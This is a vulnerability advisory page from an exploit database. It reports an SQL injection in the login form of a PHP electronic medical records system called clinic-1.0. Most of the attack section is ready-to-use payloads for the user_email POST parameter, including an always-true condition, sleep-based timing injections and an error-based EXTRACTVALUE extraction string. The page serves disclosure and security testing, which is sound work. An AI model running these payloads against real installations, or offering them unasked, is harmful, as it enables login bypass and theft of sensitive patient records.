---
title: clinic-1.0-Patrick-Mvuma SQLi - multiple
url: https://cxsecurity.com/issue/WLB-2026110006
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-11-27
fetch_date: 2026-11-28T09:35:05.790526
---

# clinic-1.0-Patrick-Mvuma SQLi - multiple

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **clinic-1.0-Patrick-Mvuma SQLi - multiple** **2026.11.27**  Credit:  **[nu11secur1ty](https://cxsecurity.com/author/nu11secur1ty/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

# Titles: clinic-1.0-Patrick-Mvuma SQLi - multiple
# Author: nu11secur1ty
# Date: 11/27/2026
# Vendor: https://mw.linkedin.com/in/patrick-mvuma-890957a5
# Software: https://www.sourcecodester.com/download-code?nid=13475&title=Electronic+Medical+Records+System+%28EMR%29+using+PHP+with+Source+Code
# Reference: https://portswigger.net/web-security/sql-injection
## Description:
The user\_email parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the user\_email parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.
Additionally, the payload 47146588' or 1415=1415-- was submitted in the user\_email parameter, and a database error message was returned. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.
Additionally, the payload '+(select\*from(select(sleep(20)))a)+' was submitted in the user\_email parameter. The application took 20017 milliseconds to respond to the request, compared with 6 milliseconds for the original request, indicating that the injected SQL command caused a time delay.
STATUS: CRITICAL
[+]Payload:
```
Parameter: user\_email (POST)
Type: error-based
Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
Payload: user\_email=nsjWTqll@burpcollaborator.net' AND EXTRACTVALUE(9725,CONCAT(0x5c,0x716b707071,(SELECT (ELT(9725=9725,1))),0x71626b6a71))# ykMK&password=z3M!u4s!M8&login\_button=
Type: time-based blind
Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
Payload: user\_email=nsjWTqll@burpcollaborator.net' AND (SELECT 6285 FROM (SELECT(!SLEEP(11)))FZlr)# HuiC&password=z3M!u4s!M8&login\_button=
```
# Reproduce:
[href](https://odysee.com/@nu11secur1ty:b/clinic-1.0-Patrick-Mvuma-SQLi:f23b336ed5)
# Demo:
[href](https://odysee.com/@nu11secur1ty:b/clinic-1.0-Patrick-Mvuma-SQLi:f23b336ed5)
# Time spent:
00:35:00
--
System Administrator - Infrastructure Engineer
Penetration Testing Engineer
Exploit developer at https://packetstormsecurity.com/ https://cve.mitre.org/index.html
https://cxsecurity.com/ and https://www.exploit-db.com/
home page: https://www.asc3t1c-nu11secur1ty.com/
hiPEnIMR0v7QCo/+SEH9gBclAAYWGnPoBIQ75sCj60E=
nu11secur1ty <https://www.asc3t1c-nu11secur1ty.com/>

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026110006)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top